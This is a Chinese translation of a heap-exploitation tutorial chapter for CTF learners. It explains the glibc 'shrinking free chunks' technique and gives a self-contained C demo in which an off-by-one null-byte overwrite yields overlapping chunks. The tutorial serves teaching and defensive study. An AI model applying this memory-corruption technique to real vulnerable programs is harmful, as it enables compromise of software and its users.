---
title: Heap Exploitation系列翻译-12 Shrinking Free Chunks
tags: [CTF, pwn, heap]
layout: post
categories: translations
---

> 本文是对Dhaval Kapil的[Heap Exploitation](https://heap-exploitation.dhavalkapil.com/)系列教程的译文

这项攻击在'[Glibc Adventures: The Forgotten Chunk](http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf)'中有详细描述. 它是利用单字节堆溢出(通常也被称作 '[off by one](https://en.wikipedia.org/wiki/Off-by-one_error)'). 这项攻击技术的目标是让'malloc'返回一个跟某一已分配堆块重叠的堆块, 该堆块目前也处在使用状态. 起始在内存中的3块连续堆块(`a`, `b`, `c`)被分配出来并且中间那块已经被释放了. 第一块堆块存在溢出漏洞, 可以利用溢出覆写中间堆块的'size'. 攻击者的最低有效字节是0, 也就'缩减'了堆块的大小. 接下来,从中间的空闲堆块中分配出两个small chunks(`b1` 和 `b2`). 第三个堆块的`prev_size`并没有得到更新, 因为`b`+`b->size`已经不再指向`c`, 实际上它指向的是在`c`之前的一块内存区域. 之后, `b1`和`c`都被释放, `c`仍旧认定`b`是处于空闲的(这是因为`prev_size`并没有更新,因此`c`-`c->prev_size`依旧指向`b`)并与`b`进行合并. 这也就导致了生成一个起始于`b`大空闲块并同时与`b2`相重叠了. 一个新的malloc将这个大堆块返回回来, 从而完成这项攻击. 下图总结了这些步骤:

![Summary of shrinking free chunks attack steps](https://heap-exploitation.dhavalkapil.com/assets/images/shrinking_free_chunks.png)

_图片来源: https://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf_

考虑以下示例代码(下载完整版本: [这里](https://heap-exploitation.dhavalkapil.com/assets/files/shrinking_free_chunks.c))


```c
struct chunk_structure {
  size_t prev_size;
  size_t size;
  struct chunk_structure *fd;
  struct chunk_structure *bk;
  char buf[19];               // padding
};

void *a, *b, *c, *b1, *b2, *big;
struct chunk_structure *b_chunk, *c_chunk;

// Grab three consecutive chunks in memory
a = malloc(0x100);                            // at 0xfee010
b = malloc(0x200);                            // at 0xfee120
c = malloc(0x100);                            // at 0xfee330

b_chunk = (struct chunk_structure *)(b - 2*sizeof(size_t));
c_chunk = (struct chunk_structure *)(c - 2*sizeof(size_t));

// free b, now there is a large gap between 'a' and 'c' in memory
// b will end up in unsorted bin
free(b);

// Attacker overflows 'a' and overwrites least significant byte of b's size
// with 0x00. This will decrease b's size.
*(char *)&b_chunk->size = 0x00;

// Allocate another chunk
// 'b' will be used to service this chunk.
// c's previous size will not updated. In fact, the update will be done a few
// bytes before c's previous size as b's size has decreased.
// So, b + b->size is behind c.
// c will assume that the previous chunk (c - c->prev_size = b/b1) is free
b1 = malloc(0x80);                           // at 0xfee120

// Allocate another chunk
// This will come directly after b1
b2 = malloc(0x80);                           // at 0xfee1b0
strcpy(b2, "victim's data");

// Free b1
free(b1);

// Free c
// This will now consolidate with b/b1 thereby merging b2 within it
// This is because c's prev_in_use bit is still 0 and its previous size
// points to b/b1
free(c);

// Allocate a big chunk to cover b2's memory as well
big = malloc(0x200);                          // at 0xfee120
memset(big, 0x41, 0x200 - 1);

printf("%s\n", (char *)b2);       // Prints AAAAAAAAAAA... !
```

`big`现在指向一开始的`b`堆块并且与`b2`重叠. 更改`big`的内容会改变`b2`的内容, 即时两个堆块都不会被释放.

值得注意的是, 与缩减`b`块相反, 攻击者其实也可以增加`b`块的大小. 这也同样可以造成类似情况的重叠. 当'malloc'申请另一个更大的堆块, `b`就会用于满足这个申请需求, 这样`c`的内存也会作为新堆块的一部分返回回来.
